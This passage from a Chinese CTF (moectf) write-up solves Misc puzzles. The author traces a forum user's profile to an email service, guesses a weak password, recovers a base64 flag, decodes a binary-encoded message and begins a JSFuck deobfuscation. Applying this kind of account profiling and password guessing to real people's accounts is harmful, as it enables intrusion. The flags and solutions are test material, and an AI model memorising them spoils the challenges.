class="line">moectf&#123;W0w_Y0u_c@n_e5cap3_fr0m_c4nary!&#125;</span><br></pre></td></tr></table></figure><h1 id="0x02-Misc"><a href="#0x02-Misc" class="headerlink" title="0x02.Misc"></a>0x02.Misc</h1><h2 id="简-单-的社工题"><a href="#简-单-的社工题" class="headerlink" title="简 单 的社工题"></a>简 单 的社工题</h2><p>提示贴吧，我们来到<code>moectf吧</code>，发现这样一个帖子</p><img src="https://i.loli.net/2020/08/09/vd5xKPI8GijfU1J.jpg" alt="_Z1G_175TDBK@1F05F@355Q.jpg" style="zoom: 33%;" /><p>没有额外的信息，于是我们来到发帖人的主页面，发现发帖人只关注了一个人</p><img src="https://i.loli.net/2020/08/09/NbqLYV6teWK5ac4.jpg" alt="6NGB@MPTK@K3CHM3UK7IN_C.jpg" style="zoom:33%;" /><p>我们来到这个人的主页面看看</p><img src="https://i.loli.net/2020/08/09/GncNxdL3VBOEqme.jpg" alt="4_ZSME_W6O4V@_X_OT2_I_K.jpg" style="zoom: 33%;" /><p>没有收获，我们又查看他所关注的贴吧</p><img src="https://i.loli.net/2020/08/09/QCOLqFobD9VR6Pz.jpg" alt="8_89V_9@_634~83__YVG_8D.jpg" style="zoom:33%;" /><p>从下往上看是：<code>923431ourmail.</code></p><p>推测应该是一个邮箱，但是点的后面的域名不清楚</p><p>百度ourmail得到<code>ourmail.cn</code>，于是我们知道了一个叫做ourmail的东西XD</p><p>在ourmail搜索<a href="mailto:923431@ourmail.cn">923431@ourmail.cn</a>，果然有</p><p><img src="https://i.loli.net/2020/08/09/vuzECAyDQGUibWx.png" alt="image.png"></p><p>没给密码，推测是弱口令，尝试了几个弱口令得到加群密码<code>a123456</code></p><p>进入后发现这样一个邮件：</p><p><img src="https://i.loli.net/2020/08/09/o6kIlzaSBTD8Vs2.png" alt="image.png"></p><p>发帖人叫<code>/s</code>，邮件内容是<code>address: 1O9JFcsUyqQ7T85WXmHH6nQ</code>，还回了个<code>a3cj</code></p><p>/s/address很明显是百度网盘链接的格式</p><p>输入<code>pan.baidu.com/s/1O9JFcsUyqQ7T85WXmHH6nQ</code>，果然得到了一个分析文件的链接 </p><p><img src="https://i.loli.net/2020/08/09/M6dEt8lkYCz3XFm.png" alt="image.png"></p><p>我们将<code>a3cj</code>作为提取码输入，成功获得文件，下载，解压得如下文本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bW9lY3RmJTdCdzB3X1kwdV9jNG5fZjFuZF9tM19vdVQlMjElN0Q&#x3D;</span><br></pre></td></tr></table></figure><p>比较明显的base64特征，解密，得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;w0w_Y0u_c4n_f1nd_m3_ouT!&#125;</span><br></pre></td></tr></table></figure><h2 id="不-会-吧-？-就-这-¿"><a href="#不-会-吧-？-就-这-¿" class="headerlink" title="不 会 吧 ？ 就 这 ¿"></a>不 会 吧 ？ 就 这 ¿</h2><p>老阴阳人le</p><p>图片改后缀zip解压得文本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">不会吧？ 就这¿ 就这¿ 不会吧？ 不会吧？ 就这¿ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 就这¿ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">就这¿ 就这¿ 就这¿ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 就这¿ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 就这¿ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 就这¿ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ 就这¿</span><br></pre></td></tr></table></figure><p>文本中只有<code>不会吧？</code>和<code>就这¿</code>，推测是二进制</p><p>每行长度都是八个词，末尾都是“就这¿”，ASCII码的二进制最高位都是0，故推测是ASCII码逆序</p><p>工具人手动转码结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">10011010</span><br><span class="line">00001100</span><br><span class="line">10101110</span><br><span class="line">11111010</span><br><span class="line">11101110</span><br><span class="line">00010110</span><br><span class="line">00101100</span><br><span class="line">00101110</span><br><span class="line">11111100</span><br><span class="line">10110100</span><br><span class="line">00001100</span><br><span class="line">01110110</span><br><span class="line">10001100</span><br><span class="line">10011110</span><br><span class="line">11111010</span><br><span class="line">00101110</span><br><span class="line">00010110</span><br><span class="line">10001100</span><br><span class="line">11001010</span><br><span class="line">11111100</span><br></pre></td></tr></table></figure><p>逆序后转成数字就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">89</span><br><span class="line">48</span><br><span class="line">117</span><br><span class="line">95</span><br><span class="line">119</span><br><span class="line">104</span><br><span class="line">52</span><br><span class="line">116</span><br><span class="line">63</span><br><span class="line">45</span><br><span class="line">48</span><br><span class="line">110</span><br><span class="line">49</span><br><span class="line">121</span><br><span class="line">95</span><br><span class="line">116</span><br><span class="line">104</span><br><span class="line">49</span><br><span class="line">83</span><br><span class="line">63</span><br></pre></td></tr></table></figure><p>对照ASCII码表即得flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Y0u_wh4t?-0n1y_th1S?&#125;</span><br></pre></td></tr></table></figure><h2 id="A3FXCK"><a href="#A3FXCK" class="headerlink" title="A3FXCK"></a>A3FXCK</h2><p>惯例的图片后缀名改zip解压得到这样一个文本文档</p><p><img src="https://i.loli.net/2020/10/08/La7GHyJqUgs8Ypk.png" alt="image.png"></p><p>开头第一行提示<code>123456</code>对应<code>[]()+!</code>，而文本中存在<code>luoq1an</code>、<code>arttnba2</code>、<code>arttnba3</code>、<code>luoqi4n</code>、<code>arttnba5</code>、<code>arttnba6</code>，故考虑进行字符串替换</p><p>得到如下文本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]